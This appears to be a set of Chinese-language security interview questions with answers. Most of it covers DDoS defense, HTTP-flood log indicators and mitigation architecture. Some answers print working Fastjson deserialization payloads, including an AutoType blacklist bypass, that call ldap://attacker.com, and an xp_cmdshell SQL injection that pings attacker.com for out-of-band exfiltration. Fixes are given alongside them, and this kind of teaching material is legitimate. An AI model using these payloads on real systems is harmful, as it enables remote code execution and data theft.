    <h2>
     上难度
    </h2>
    <p>
     <strong>
      问题1
     </strong>
     ：
     <br/>
     设计抗DDoS方案时，如何在网络层、传输层、应用层分别部署防护？各列举2项关键技术。
    </p>
    <p>
     <strong>
      答案
     </strong>
     ：
    </p>
    <ul>
     <li>
      <p>
       <strong>
        网络层
       </strong>
       ：BGP AnyCast分流、SYN Cookie防御
      </p>
     </li>
     <li>
      <p>
       <strong>
        传输层
       </strong>
       ：TCP速率限制、连接状态检测（如FIN包验证）
      </p>
     </li>
     <li>
      <p>
       <strong>
        应用层
       </strong>
       ：JavaScript Challenge、行为分析（如鼠标移动频率）
      </p>
     </li>
    </ul>
    <p>
     <strong>
      问题2
     </strong>
     ：
     <br/>
     如何通过Nginx日志分析识别HTTP Flood攻击？给出至少3个关键指标及对应阈值设置逻辑。
    </p>
    <p>
     <strong>
      答案
     </strong>
     ：
    </p>
    <ol>
     <li>
      <p>
       <strong>
        请求频率
       </strong>
       ：单IP &gt; 1000次/分钟（基线动态调整）
      </p>
     </li>
     <li>
      <p>
       <strong>
        User-Aent分布
       </strong>
       ：异常集中（如90%请求使用相同UA）
      </p>
     </li>
     <li>
      <p>
       <strong>
        URL熵值
       </strong>
       ：大量随机路径请求（如
       <code>
        /asdf1234
       </code>
       ）
      </p>
     </li>
     <li>
      <p>
       <strong>
        响应码比例
       </strong>
       ：高比例404/400（扫描特征）
      </p>
     </li>
    </ol>
    <p>
     <strong>
      问题3
     </strong>
     ：
     <br/>
     分析Fastjson 1.2.24反序列化漏洞利用条件，给出利用
     <code>
      JdbcRowSetImpl
     </code>
     的完整Payload及修复方案。
    </p>
    <p>
     <strong>
      答案
     </strong>
     ：
    </p>
    <ul>
     <li>
      <p>
       <strong>
        Payload
       </strong>
       ：
      </p>
     </li>
    </ul>
    <pre><code>{
  "@type":"com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName":"ldap://attacker.com/Exploit",
  "autoCommit":true
}
</code></pre>
    <ul>
     <li>
      <strong>
       修复
      </strong>
      ：
      <ol>
       <li>
        <p>
         升级至1.2.25+并启用
         <code>
          safeMode
         </code>
        </p>
       </li>
       <li>
        <p>
         配置
         <code>
          ParserConfig.getGlobalInstance().addDeny("com.sun.rowset")
         </code>
        </p>
       </li>
      </ol>
     </li>
    </ul>
    <p>
     <strong>
      问题4
     </strong>
     ：
     <br/>
     Fastjson 1.2.68修补了AutoType绕过漏洞，请解释攻击者如何通过异常抛出机制绕过黑名单检测。
    </p>
    <p>
     <strong>
      答案
     </strong>
     ：
    </p>
    <ul>
     <li>
      <strong>
       绕过原理
      </strong>
      ：
      <ol>
       <li>
        <p>
         利用
         <code>
          java.lang.Exception
         </code>
         子类中的
         <code>
          @type
         </code>
         字段触发反序列化
        </p>
       </li>
       <li>
        <p>
         异常类加载时绕过
         <code>
          checkAutoType()
         </code>
         检查
        </p>
       </li>
      </ol>
     </li>
     <li>
      <p>
       <strong>
        Payload示例
       </strong>
       ：
      </p>
     </li>
    </ul>
    <pre><code>{
  "@type":"java.lang.Exception",
  "@type":"com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName":"ldap://attacker.com/exp",
  "autoCommit":true
}
</code></pre>
    <p>
     <strong>
      问题5
     </strong>
     ：
     <br/>
     某系统允许通过SQL语句调用存储过程，如何利用
     <code>
      xp_cmdshell
     </code>
     实现RCE？说明防御的多层方案。
    </p>
    <p>
     <strong>
      答案
     </strong>
     ：
    </p>
    <ul>
     <li>
      <strong>
       攻击步骤
      </strong>
      ：
      <ol>
       <li>
        <p>
         注入语句：
         <code>
          '; EXEC master..xp_cmdshell 'ping attacker.com'--
         </code>
        </p>
       </li>
       <li>
        <p>
         通过DNS或ICMP外带数据
        </p>
       </li>
      </ol>
     </li>
     <li>
      <strong>
       防御方案
      </strong>
      ：
      <ol>
       <li>
        <p>
         数据库层：禁用
         <code>
          xp_cmdshell
         </code>
         、最小权限运行
        </p>
       </li>
       <li>
        <p>
         应用层：输入过滤（如禁用
         <code>
          EXEC
         </code>
         关键字）
        </p>
       </li>
       <li>
        <p>
         网络层：出站流量监控
        </p>
       </li>
      </ol>
     </li>
    </ul>
    <p>
     <strong>
      问题
     </strong>
     ：
     <br/>
     设计抗DDoS方案时，如何保障核心业务在500Gbps流量攻击下的可用性？需包含架构设计及应急响应流程。
    </p>
    <p>
     <strong>
      答案
     </strong>
     ：
    </p>
    <ul>
     <li>
      <strong>
       架构设计
      </strong>
      ：
      <ol>
       <li>
        <p>
         流量清洗中心：AnyCast+GRE隧道引流
        </p>
       </li>
       <li>
        <p>
         多CDN动态调度（如Cloudflare+Akamai）
        </p>
       </li>
       <li>
        <p>
         业务降级：静态页面回退、非核心服务限流
        </p>
       </li>
      </ol>
     </li>
     <li>
      <strong>
       应急流程
      </strong>
      ：
      <ol>
       <li>
        <p>
         实时监控触发阈值（如95%带宽占用）
        </p>
       </li>
       <li>
        <p>
         自动切换至清洗中心
        </p>
       </li>
       <li>
        <p>
         人工分析攻击特征更新防护规则
        </p>
       </li>
      </ol>
     </li>
    </ul>
